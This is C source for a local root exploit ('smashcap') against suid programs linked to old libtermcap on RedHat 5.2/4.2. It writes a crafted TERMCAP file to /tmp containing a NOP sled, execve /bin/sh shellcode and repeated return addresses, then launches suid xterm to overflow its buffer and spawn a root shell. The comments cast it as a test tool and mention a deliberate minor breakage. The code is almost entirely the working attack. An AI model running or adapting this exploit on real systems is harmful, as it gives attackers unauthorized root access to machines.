/* Local exploit for suid root programs linked to libtermcap < 2.0.8-15 
 *
 * tested with xterm and nxterm on RedHat 5.2 and 4.2
 *
 * sk8@lucid-solutions.com
 * http://www.lucid-solutions.com
 *
 * Usage:
 * ./smashcap  		-default is buffer size of 4210 and offset of 300
 *			 and seems to work on RH 5.2
 *
 * Adjust offsets (somewhere between 230 - 1140) if necessary
 *
 * ./smashcap <offset> 	-buffer size defaults to 4210
 * ./smashcap <offset> <buffersize>
 *
 *
 * In order to stop script kids/opportunists, one MINOR change must be
 * made in order for this to work.  
 *
 * Use only to test your machines to show you that you must patch libtermcap.
 * Quick fix, chmod u-s ALL suid root programs linked with libtermcap.
 *
 *						- sk8 of LS
 *
 */

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define filename "/tmp/lstermcap"
#define entry1   "xterm|"
#define DEFAULT_BUFSIZE 4210

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"; /* Linux shellcode */

long get_sp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(int argc, char *argv[]) {
   int bufsize, offset, i, fd;
   long *bufptr;
   char *ptr, *buffer, *tempbuf;

   setenv("TERMCAP", "/tmp/lstermcap", 1);


   bufsize=DEFAULT_BUFSIZE;

   if (argc > 2) bufsize=atoi(argv[2]);
   if (argc > 1) offset=atoi(argv[1]);
   else offset=300;
  

   printf("bufsize: %i\noffset: %i\n", bufsize,offset);

   if(!(buffer = malloc(bufsize))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }
  if(!(tempbuf = malloc(bufsize+strlen(entry1) ))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }

   printf("get_sp(): 0x%x\n", get_sp());
   printf("get_sp()-offs: 0x%x\n", (get_sp()-offset) );

   ptr=buffer;
   bufptr = (long *)(buffer+2); /* align */

   for (i = 0; i < bufsize; i += 4)
      	*(bufptr++) = (get_sp()-offset);

   	for (i = 0; i < (bufsize/2); i++) 
     		 buffer[i] = 0x90;

	ptr=buffer + ((bufsize/2) - strlen(shellcode)/2);
  	for (i = 0; i < strlen(shellcode); i++)
      		*(ptr++) = shellcode[i]; //shellcode


  	ptr=ptr+24;

	/* now insert the characters : and \ into the termcap - these are vital */
  	*(ptr++)=0x3a;  
  	*(ptr++)=0x5c;  


   	snprintf(tempbuf, (bufsize+strlen(entry1)), "%s%s%s", entry1, buffer);
   	fd = open(filename, O_WRONLY|O_CREAT|O_TRUNC, 0666);
   	write (fd, tempbuf, strlen(tempbuf));
   	close(fd);
	printf("made termcap\n");

	execl("/usr/X11R6/bin/xterm","xterm", 0);
	
}

